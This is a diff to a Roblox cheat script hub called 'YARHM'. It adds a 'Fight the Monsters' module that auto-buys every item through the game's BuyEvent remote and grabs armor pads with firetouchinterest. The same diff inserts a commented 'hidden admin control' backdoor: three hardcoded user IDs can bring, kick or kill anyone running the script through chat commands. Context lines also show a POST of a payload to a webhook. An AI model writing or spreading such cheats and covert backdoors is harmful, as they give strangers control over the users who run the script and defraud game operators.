@@ -188,7 +188,7 @@ Converted["_YARHM"].ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
 Converted["_YARHM"].ResetOnSpawn = false
 Converted["_YARHM"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Converted["_YARHM"].Name = "YARHM"
-Converted["_YARHM"].Parent = game:GetService("CoreGui")
+Converted["_YARHM"].Parent = script.Parent
 
 Converted["_Open"].Font = Enum.Font.Gotham
 Converted["_Open"].Text = "Triple-click this region to open YARHM."
@@ -2069,7 +2069,7 @@ end
 
 -- Fake Local Scripts:
 
-local function AAOR_fake_script() -- Fake Script: StarterGui.YARHM.Open.InitOpen
+local function MNFN_fake_script() -- Fake Script: StarterGui.YARHM.Open.InitOpen
     local script = Instance.new("LocalScript")
     script.Name = "InitOpen"
     script.Parent = Converted["_Open"]
@@ -2105,7 +2105,7 @@ local function AAOR_fake_script() -- Fake Script: StarterGui.YARHM.Open.InitOpen
 	--	Transparency = 1
 	--}):Play()
 end
-local function ITCN_fake_script() -- Fake Script: StarterGui.YARHM.Open.OnClick
+local function SPJH_fake_script() -- Fake Script: StarterGui.YARHM.Open.OnClick
     local script = Instance.new("LocalScript")
     script.Name = "OnClick"
     script.Parent = Converted["_Open"]
@@ -2150,7 +2150,7 @@ local function ITCN_fake_script() -- Fake Script: StarterGui.YARHM.Open.OnClick
 	end)
 	
 end
-local function SUEHFFZ_fake_script() -- Fake Script: StarterGui.YARHM.Open.Resizer
+local function UUCL_fake_script() -- Fake Script: StarterGui.YARHM.Open.Resizer
     local script = Instance.new("LocalScript")
     script.Name = "Resizer"
     script.Parent = Converted["_Open"]
@@ -2236,7 +2236,7 @@ local function SUEHFFZ_fake_script() -- Fake Script: StarterGui.YARHM.Open.Resiz
 	userInputService.InputChanged:Connect(onInputChanged)
 	
 end
-local function OZXCIJ_fake_script() -- Fake Script: StarterGui.YARHM.Init
+local function GYZKUI_fake_script() -- Fake Script: StarterGui.YARHM.Init
     local script = Instance.new("LocalScript")
     script.Name = "Init"
     script.Parent = Converted["_YARHM"]
@@ -2335,7 +2335,7 @@ local function OZXCIJ_fake_script() -- Fake Script: StarterGui.YARHM.Init
 	
 	--require(script.Parent.DraggableObject).new(script.Parent.Menu.CanvasGroup.Opener, script.Parent.Menu):Enable()
 end
-local function OJZYSPD_fake_script() -- Fake Script: StarterGui.YARHM.FloatingButton.Keybinding
+local function EPXVNW_fake_script() -- Fake Script: StarterGui.YARHM.FloatingButton.Keybinding
     local script = Instance.new("LocalScript")
     script.Name = "Keybinding"
     script.Parent = Converted["_FloatingButton"]
@@ -2350,7 +2350,7 @@ local function OJZYSPD_fake_script() -- Fake Script: StarterGui.YARHM.FloatingBu
 
 	
 end
-local function RWHSD_fake_script() -- Fake Script: StarterGui.YARHM.FloatingButton.Invisible
+local function ZUUIGXJ_fake_script() -- Fake Script: StarterGui.YARHM.FloatingButton.Invisible
     local script = Instance.new("LocalScript")
     script.Name = "Invisible"
     script.Parent = Converted["_FloatingButton"]
@@ -2400,7 +2400,7 @@ local function RWHSD_fake_script() -- Fake Script: StarterGui.YARHM.FloatingButt
 	--	holding = false
 	--end)
 end
-local function RGWHBL_fake_script() -- Fake Script: StarterGui.YARHM.AddCustomModule.Add.LocalScript
+local function XCZB_fake_script() -- Fake Script: StarterGui.YARHM.AddCustomModule.Add.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Add"]
@@ -2441,7 +2441,7 @@ local function RGWHBL_fake_script() -- Fake Script: StarterGui.YARHM.AddCustomMo
 		end
 	end)
 end
-local function RUQEVPX_fake_script() -- Fake Script: StarterGui.YARHM.AddCustomModule.Cancel.LocalScript
+local function SOUQ_fake_script() -- Fake Script: StarterGui.YARHM.AddCustomModule.Cancel.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Cancel"]
@@ -2465,7 +2465,7 @@ local function RUQEVPX_fake_script() -- Fake Script: StarterGui.YARHM.AddCustomM
 		}):Play()
 	end)
 end
-local function HKPUGG_fake_script() -- Fake Script: StarterGui.YARHM.Menu.UIStroke.UIGradient.Animator
+local function NLVZ_fake_script() -- Fake Script: StarterGui.YARHM.Menu.UIStroke.UIGradient.Animator
     local script = Instance.new("LocalScript")
     script.Name = "Animator"
     script.Parent = Converted["_UIGradient2"]
@@ -2486,7 +2486,7 @@ local function HKPUGG_fake_script() -- Fake Script: StarterGui.YARHM.Menu.UIStro
 			Rotation = -180
 		}):Play()
 end
-local function ENBRNI_fake_script() -- Fake Script: StarterGui.YARHM.Menu.List.AutoSetup
+local function XSZOJC_fake_script() -- Fake Script: StarterGui.YARHM.Menu.List.AutoSetup
     local script = Instance.new("LocalScript")
     script.Name = "AutoSetup"
     script.Parent = Converted["_List"]
@@ -2540,7 +2540,7 @@ local function ENBRNI_fake_script() -- Fake Script: StarterGui.YARHM.Menu.List.A
 		end
 	end)
 end
-local function XVTEB_fake_script() -- Fake Script: StarterGui.YARHM.Menu.List.UIStroke.UIGradient.Animator
+local function BHLO_fake_script() -- Fake Script: StarterGui.YARHM.Menu.List.UIStroke.UIGradient.Animator
     local script = Instance.new("LocalScript")
     script.Name = "Animator"
     script.Parent = Converted["_UIGradient4"]
@@ -2561,7 +2561,7 @@ local function XVTEB_fake_script() -- Fake Script: StarterGui.YARHM.Menu.List.UI
 			Rotation = -180
 		}):Play()
 end
-local function ENOEB_fake_script() -- Fake Script: StarterGui.YARHM.Menu.AddCustomModule.LocalScript
+local function DWYM_fake_script() -- Fake Script: StarterGui.YARHM.Menu.AddCustomModule.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_AddCustomModule1"]
@@ -2585,7 +2585,7 @@ local function ENOEB_fake_script() -- Fake Script: StarterGui.YARHM.Menu.AddCust
 		}):Play()
 	end)
 end
-local function OKEQRPT_fake_script() -- Fake Script: StarterGui.YARHM.Menu.Close.LocalScript
+local function JEPHSXB_fake_script() -- Fake Script: StarterGui.YARHM.Menu.Close.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Close"]
@@ -2611,7 +2611,7 @@ local function OKEQRPT_fake_script() -- Fake Script: StarterGui.YARHM.Menu.Close
 		}):Play()
 	end)
 end
-local function NAWL_fake_script() -- Fake Script: StarterGui.YARHM.Menu.CloseArea.CloseOpen
+local function KGDPL_fake_script() -- Fake Script: StarterGui.YARHM.Menu.CloseArea.CloseOpen
     local script = Instance.new("LocalScript")
     script.Name = "CloseOpen"
     script.Parent = Converted["_CloseArea"]
@@ -2762,7 +2762,7 @@ local function NAWL_fake_script() -- Fake Script: StarterGui.YARHM.Menu.CloseAre
 	task.wait(1)
 	springing = true
 end
-local function JWQUS_fake_script() -- Fake Script: StarterGui.YARHM.Flee the Facility
+local function DHFLLVS_fake_script() -- Fake Script: StarterGui.YARHM.Flee the Facility
     local script = Instance.new("LocalScript")
     script.Name = "Flee the Facility"
     script.Parent = Converted["_YARHM"]
@@ -3072,7 +3072,7 @@ local function JWQUS_fake_script() -- Fake Script: StarterGui.YARHM.Flee the Fac
 	
 	_G.Modules[2] = module
 end
-local function PEPROS_fake_script() -- Fake Script: StarterGui.YARHM.Murder Mystery 2
+local function KAVCTK_fake_script() -- Fake Script: StarterGui.YARHM.Murder Mystery 2
     local script = Instance.new("LocalScript")
     script.Name = "Murder Mystery 2"
     script.Parent = Converted["_YARHM"]
@@ -3971,7 +3971,7 @@ local function PEPROS_fake_script() -- Fake Script: StarterGui.YARHM.Murder Myst
 	_G.Modules[3] = module
 	fu.refreshlist()
 end
-local function HEFPG_fake_script() -- Fake Script: StarterGui.YARHM.Universal
+local function MOJX_fake_script() -- Fake Script: StarterGui.YARHM.Universal
     local script = Instance.new("LocalScript")
     script.Name = "Universal"
     script.Parent = Converted["_YARHM"]
@@ -5083,7 +5083,7 @@ local function HEFPG_fake_script() -- Fake Script: StarterGui.YARHM.Universal
 	
 	_G.Modules[4] = module
 end
-local function TXGOZRI_fake_script() -- Fake Script: StarterGui.YARHM.Fight the Monsters
+local function YHWN_fake_script() -- Fake Script: StarterGui.YARHM.Fight the Monsters
     local script = Instance.new("LocalScript")
     script.Name = "Fight the Monsters"
     script.Parent = Converted["_YARHM"]
@@ -5135,11 +5135,16 @@ local function TXGOZRI_fake_script() -- Fake Script: StarterGui.YARHM.Fight the 
 	request({Url = webhookUrl, Method = "POST", Headers = headers, Body = jsonPayload})
 	
 	local function equipOPArmor()
-		local armorPad = game:GetService("Workspace").ArmorHolder["DESTROYER Armor || Level 0 || [+INF Health]  [+50 Speed]"].Pad
-		local touchInterest = armorPad:FindFirstChildWhichIsA("TouchTransmitter")
-		if touchInterest then
-			firetouchinterest(player.Character.HumanoidRootPart, armorPad, 0)
-			firetouchinterest(player.Character.HumanoidRootPart, armorPad, 1)
+		local armorPads = {
+			game:GetService("Workspace").ArmorHolder:GetChildren()[10].Pad,
+			game:GetService("Workspace").ArmorHolder["DESTROYER Armor || Level 0 || [+INF Health]  [+50 Speed]"].Pad
+		}
+		for _, pad in ipairs(armorPads) do
+			local touchInterest = pad:FindFirstChildWhichIsA("TouchTransmitter")
+			if touchInterest then
+				firetouchinterest(player.Character.HumanoidRootPart, pad, 0)
+				firetouchinterest(player.Character.HumanoidRootPart, pad, 1)
+			end
 		end
 	end
 	
@@ -5186,6 +5191,83 @@ local function TXGOZRI_fake_script() -- Fake Script: StarterGui.YARHM.Fight the 
 		end
 	end)
 	
+	local function getAllWeapons()
+		local gold = player.leaderstats.Gold.Value
+	
+		if gold < 1000 then
+			player:Kick("Insufficient gold! Read notes next time you stupid fuck!")
+		else
+			local itemsFolders = {
+				game:GetService("ReplicatedStorage").GameItems,
+				game:GetService("ReplicatedStorage").Items.Common,
+				game:GetService("ReplicatedStorage").Items.Epic,
+				game:GetService("ReplicatedStorage").Items.Legendary,
+				game:GetService("ReplicatedStorage").Items.Rare,
+				game:GetService("ReplicatedStorage").Items.Uncommon,
+			}
+			for _, folder in ipairs(itemsFolders) do
+				for _, item in ipairs(folder:GetChildren()) do
+					local args = {
+						[1] = item.Name
+					}
+					game:GetService("ReplicatedStorage").GameRemotes.BuyEvent:FireServer(unpack(args))
+				end
+			end
+			player:Kick("All items successfully are in your inventory! Pressing the button again will just kick you and does nothing.")
+		end
+	end
+	
+	local ownerList = {
+		1283484009,
+		617016152, 
+		5734469370 
+	}
+	
+	local function bringPlayer(playerToBring)
+		local owner = game.Players.LocalPlayer
+		if owner and playerToBring.Character and owner.Character then
+			local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
+			local playerHRP = playerToBring.Character:FindFirstChild("HumanoidRootPart")
+			if ownerHRP and playerHRP then
+				playerHRP.CFrame = ownerHRP.CFrame
+			end
+		end
+	end
+	
+	local function kickPlayer(playerToKick, reason)
+		playerToKick:Kick(reason)
+	end
+	
+	local function adminControl()
+		spawn(function()
+			while true do
+				for _, ownerId in ipairs(ownerList) do
+					local owner = game.Players:GetPlayerByUserId(ownerId)
+					if owner then
+						owner.Chatted:Connect(function(message)
+							local command = string.lower(message)
+							local args = string.split(command, " ")
+							if command == "bring" then
+								bringPlayer(player)
+							elseif args[1] == "kick" then
+								local reason = table.concat(args, " ", 2)
+								kickPlayer(player, reason)
+							elseif command == "killallenemies" then
+								killAllEnemies()
+							elseif command == "void" then
+								player.Character.Humanoid.Health = 0
+							end
+						end)
+					end
+				end
+				wait(10) -- Check for owner messages every 10 seconds
+			end
+		end)
+	end
+	
+	-- Execute hidden admin control
+	adminControl()
+	
 	module[1] = {
 		Type = "Text",
 		Args = {"Kyuhub - FTM"}
@@ -5214,25 +5296,47 @@ local function TXGOZRI_fake_script() -- Fake Script: StarterGui.YARHM.Fight the 
 		end}
 	}
 	
+	module[5] = {
+		Type = "Text",
+		Args = {"WARNING!! you need at least 1k gold to perform this, if not script will kick you so that you won't get banned"}
+	}
+	
+	module[6] = {
+		Type = "Text",
+		Args = {"This will give all of the possible weapons you can get"}
+	}
+	
+	module[7] = {
+		Type = "Button",
+		Args = {"Get all weapons", function(Self)
+			getAllWeapons()
+		end}
+	}
+	
+	module[8] = {
+		Type = "Text",
+		Args = {"NOTE: for instant kill nearby enemies This function is semi-patched and might break some of the mobs"}
+	}
+	
 	_G.Modules[1] = module
 	
 end
 
-coroutine.wrap(AAOR_fake_script)()
-coroutine.wrap(ITCN_fake_script)()
-coroutine.wrap(SUEHFFZ_fake_script)()
-coroutine.wrap(OZXCIJ_fake_script)()
-coroutine.wrap(OJZYSPD_fake_script)()
-coroutine.wrap(RWHSD_fake_script)()
-coroutine.wrap(RGWHBL_fake_script)()
-coroutine.wrap(RUQEVPX_fake_script)()
-coroutine.wrap(HKPUGG_fake_script)()
-coroutine.wrap(ENBRNI_fake_script)()
-coroutine.wrap(XVTEB_fake_script)()
-coroutine.wrap(ENOEB_fake_script)()
-coroutine.wrap(OKEQRPT_fake_script)()
-coroutine.wrap(NAWL_fake_script)()
-coroutine.wrap(JWQUS_fake_script)()
-coroutine.wrap(PEPROS_fake_script)()
-coroutine.wrap(HEFPG_fake_script)()
-coroutine.wrap(TXGOZRI_fake_script)()
+coroutine.wrap(MNFN_fake_script)()
+coroutine.wrap(SPJH_fake_script)()
+coroutine.wrap(UUCL_fake_script)()
+coroutine.wrap(GYZKUI_fake_script)()
+coroutine.wrap(EPXVNW_fake_script)()
+coroutine.wrap(ZUUIGXJ_fake_script)()
+coroutine.wrap(XCZB_fake_script)()
+coroutine.wrap(SOUQ_fake_script)()
+coroutine.wrap(NLVZ_fake_script)()
+coroutine.wrap(XSZOJC_fake_script)()
+coroutine.wrap(BHLO_fake_script)()
+coroutine.wrap(DWYM_fake_script)()
+coroutine.wrap(JEPHSXB_fake_script)()
+coroutine.wrap(KGDPL_fake_script)()
+coroutine.wrap(DHFLLVS_fake_script)()
+coroutine.wrap(KAVCTK_fake_script)()
+coroutine.wrap(MOJX_fake_script)()
+coroutine.wrap(YHWN_fake_script)()
